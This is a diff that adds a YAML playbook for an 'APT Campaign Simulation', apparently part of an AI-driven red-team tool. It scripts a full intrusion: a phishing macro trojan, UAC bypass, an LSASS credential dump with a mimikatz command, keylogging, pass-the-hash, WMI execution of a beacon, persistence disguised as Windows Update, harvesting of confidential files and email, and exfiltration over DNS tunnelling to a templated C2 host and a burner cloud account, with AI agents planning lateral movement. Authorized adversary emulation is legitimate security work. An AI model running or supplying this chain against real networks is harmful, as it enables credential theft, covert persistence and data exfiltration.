@@ -1,0 +1,327 @@
+# Full APT Campaign Simulation
+# Multi-stage attack emulating advanced persistent threats
+
+name: "APT Campaign Simulation"
+description: "Complete APT simulation from initial access to data exfiltration"
+category: "offensive"
+difficulty: "advanced"
+estimated_duration: "4-8 hours"
+requires_authorization: true
+
+# Campaign metadata
+metadata:
+  kill_date: "{{KILL_DATE}}"  # Auto-terminate date
+  auto_cleanup: true
+  max_spread: 10  # Limit worm propagation
+
+# Targeting
+targets:
+  - type: "organization"
+    name: "{{ORG_NAME}}"
+    network: "{{TARGET_NETWORK}}"
+    entry_point: "{{ENTRY_HOST}}"
+    objectives:
+      - "Gain domain admin access"
+      - "Exfiltrate sensitive documents"
+      - "Establish persistent access"
+
+# Attack chain stages
+stages:
+  # ============================================================================
+  # STAGE 1: Initial Access
+  # ============================================================================
+  - stage: 1
+    name: "Initial Access"
+    tactic: "TA0001"  # MITRE ATT&CK
+    description: "Gain initial foothold on target network"
+    tasks:
+      - name: "Phishing Campaign"
+        type: "social_engineering"
+        technique: "T1566.001"  # Spearphishing Attachment
+        payload:
+          type: "trojan"
+          format: "office_macro"
+          evasion: ["obfuscation", "anti_vm"]
+        delivery_method: "email"
+        success_criteria: "beacon_callback"
+
+      - name: "Deploy Initial Beacon"
+        type: "payload_execution"
+        payload_type: "beacon"
+        c2_channel: "https"
+        check_in_interval: 300  # 5 minutes
+        jitter: 30  # 30% randomization
+
+  # ============================================================================
+  # STAGE 2: Privilege Escalation
+  # ============================================================================
+  - stage: 2
+    name: "Privilege Escalation"
+    tactic: "TA0004"
+    description: "Escalate to local admin or SYSTEM"
+    depends_on: "stage_1"
+    tasks:
+      - name: "Enumerate Privileges"
+        type: "enumeration"
+        command: "whoami /all"
+        expected_output: "user_privileges"
+
+      - name: "Exploit UAC Bypass"
+        type: "privilege_escalation"
+        technique: "T1548.002"  # Bypass User Account Control
+        method: "fodhelper"
+        condition: "is_user_level"
+        success_criteria: "admin_privileges"
+
+      - name: "Token Impersonation"
+        type: "privilege_escalation"
+        technique: "T1134"  # Access Token Manipulation
+        method: "token_stealing"
+        condition: "has_seimpersonate"
+        success_criteria: "system_privileges"
+
+  # ============================================================================
+  # STAGE 3: Credential Access
+  # ============================================================================
+  - stage: 3
+    name: "Credential Harvesting"
+    tactic: "TA0006"
+    description: "Extract credentials for lateral movement"
+    depends_on: "stage_2"
+    tasks:
+      - name: "Dump LSASS"
+        type: "credential_dumping"
+        technique: "T1003.001"  # LSASS Memory
+        tool: "mimikatz"
+        command: "sekurlsa::logonpasswords"
+        stealth_level: "high"
+        expected_output: "credentials"
+
+      - name: "Extract Cached Credentials"
+        type: "credential_dumping"
+        technique: "T1003.005"  # Cached Domain Credentials
+        target: "SECURITY hive"
+        expected_output: "domain_credentials"
+
+      - name: "Keylogging"
+        type: "input_capture"
+        technique: "T1056.001"  # Keylogging
+        duration: 3600  # 1 hour
+        expected_output: "captured_keystrokes"
+
+  # ============================================================================
+  # STAGE 4: Discovery
+  # ============================================================================
+  - stage: 4
+    name: "Network Discovery"
+    tactic: "TA0007"
+    description: "Map internal network and identify targets"
+    depends_on: "stage_3"
+    tasks:
+      - name: "Active Directory Enumeration"
+        type: "discovery"
+        technique: "T1087.002"  # Domain Account
+        tool: "bloodhound"
+        command: "bloodhound-python -u {{USERNAME}} -p {{PASSWORD}} -d {{DOMAIN}} -c all"
+        expected_output: "ad_structure"
+
+      - name: "Network Share Enumeration"
+        type: "discovery"
+        technique: "T1135"  # Network Share Discovery
+        command: "net view /all"
+        expected_output: "network_shares"
+
+      - name: "Identify High-Value Targets"
+        type: "ai_analysis"
+        agent: "target_selector"
+        task: "Identify domain controllers, file servers, and admin workstations"
+        context:
+          - "ad_structure"
+          - "network_shares"
+          - "credentials"
+        expected_output: "priority_targets"
+
+  # ============================================================================
+  # STAGE 5: Lateral Movement
+  # ============================================================================
+  - stage: 5
+    name: "Lateral Movement"
+    tactic: "TA0008"
+    description: "Spread to additional systems"
+    depends_on: "stage_4"
+    ai_powered: true
+    tasks:
+      - name: "AI Path Planning"
+        type: "ai_planning"
+        agent: "path_planner"
+        task: "Determine optimal attack path to domain controller"
+        context:
+          - "priority_targets"
+          - "credentials"
+          - "network_topology"
+        expected_output: "attack_path"
+
+      - name: "Pass-the-Hash"
+        type: "lateral_movement"
+        technique: "T1550.002"  # Pass the Hash
+        method: "pth"
+        target: "{{NEXT_HOP}}"
+        credentials: "{{HARVESTED_NTLM}}"
+        deploy_beacon: true
+        success_criteria: "remote_access"
+
+      - name: "WMI Execution"
+        type: "lateral_movement"
+        technique: "T1047"  # Windows Management Instrumentation
+        method: "wmi"
+        command: "wmic /node:{{TARGET}} process call create beacon.exe"
+        stealth_level: "high"
+
+      - name: "Automated Pivoting"
+        type: "multi_hop_attack"
+        max_hops: 5
+        technique: "auto_pivot"
+        target_objective: "domain_controller"
+        ai_decision_making: true
+
+  # ============================================================================
+  # STAGE 6: Persistence
+  # ============================================================================
+  - stage: 6
+    name: "Establish Persistence"
+    tactic: "TA0003"
+    description: "Maintain access after reboot"
+    depends_on: "stage_5"
+    tasks:
+      - name: "Registry Run Key"
+        type: "persistence"
+        technique: "T1547.001"  # Registry Run Keys
+        key: "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        value_name: "WindowsUpdate"
+        value_data: "C:\\Windows\\System32\\beacon.exe"
+
+      - name: "Create Service"
+        type: "persistence"
+        technique: "T1543.003"  # Windows Service
+        service_name: "WindowsUpdateService"
+        binary_path: "C:\\Windows\\System32\\svc.exe"
+        start_type: "auto"
+
+      - name: "Scheduled Task"
+        type: "persistence"
+        technique: "T1053.005"  # Scheduled Task
+        task_name: "SystemHealthCheck"
+        trigger: "daily"
+        action: "C:\\Windows\\beacon.exe"
+
+  # ============================================================================
+  # STAGE 7: Collection
+  # ============================================================================
+  - stage: 7
+    name: "Data Collection"
+    tactic: "TA0009"
+    description: "Gather sensitive data"
+    depends_on: "stage_6"
+    tasks:
+      - name: "Search File Shares"
+        type: "collection"
+        technique: "T1039"  # Data from Network Shared Drive
+        patterns:
+          - "*.docx"
+          - "*.xlsx"
+          - "*.pdf"
+          - "*budget*"
+          - "*confidential*"
+        max_size: "100MB"
+        expected_output: "collected_files"
+
+      - name: "Screenshot Capture"
+        type: "collection"
+        technique: "T1113"  # Screen Capture
+        frequency: "hourly"
+        duration: "24 hours"
+        quality: "medium"
+
+      - name: "Email Archive"
+        type: "collection"
+        technique: "T1114"  # Email Collection
+        target: "outlook"
+        date_range: "last_90_days"
+        keywords: ["confidential", "secret", "restricted"]
+
+  # ============================================================================
+  # STAGE 8: Exfiltration
+  # ============================================================================
+  - stage: 8
+    name: "Data Exfiltration"
+    tactic: "TA0010"
+    description: "Extract collected data"
+    depends_on: "stage_7"
+    tasks:
+      - name: "Compress & Encrypt"
+        type: "preparation"
+        technique: "T1560.001"  # Archive via Utility
+        method: "7zip_aes256"
+        password: "{{RANDOM_PASSWORD}}"
+
+      - name: "DNS Tunneling"
+        type: "exfiltration"
+        technique: "T1048.003"  # Exfiltration Over Alternative Protocol
+        channel: "dns"
+        c2_server: "{{DNS_C2}}"
+        rate_limit: "10KB/s"  # Slow for stealth
+
+      - name: "Cloud Storage Upload"
+        type: "exfiltration"
+        technique: "T1567.002"  # Exfiltration to Cloud Storage
+        service: "dropbox"
+        account: "{{BURNER_ACCOUNT}}"
+        folder: "backup_{{TIMESTAMP}}"
+
+# ============================================================================
+# Safety Controls
+# ============================================================================
+safety:
+  kill_date: "{{KILL_DATE}}"
+  auto_cleanup: true
+  max_spread_count: 10
+  working_hours_only: false
+  geofencing:
+    allowed_countries: ["{{AUTHORIZED_COUNTRY}}"]
+
+  # Abort conditions
+  abort_on:
+    - ids_detection: true
+    - edr_detection: true
+    - sandbox_detection: true
+    - kill_switch_triggered: true
+
+  # Stealth settings
+  stealth:
+    level: "high"
+    sleep_between_actions: "random(60, 300)"  # 1-5 minutes
+    avoid_peak_hours: true
+    randomize_user_agents: true
+
+# ============================================================================
+# Reporting
+# ============================================================================
+reporting:
+  generate_report: true
+  format: ["html", "pdf", "json"]
+  include:
+    - "attack_timeline"
+    - "compromise_map"
+    - "credentials_obtained"
+    - "data_exfiltrated"
+    - "persistence_mechanisms"
+    - "detection_events"
+    - "recommendations"
+
+  # Metrics
+  metrics:
+    - "time_to_domain_admin"
+    - "stealth_score"
+    - "detection_rate"
+    - "data_exfiltrated_bytes"
+    - "hosts_compromised"
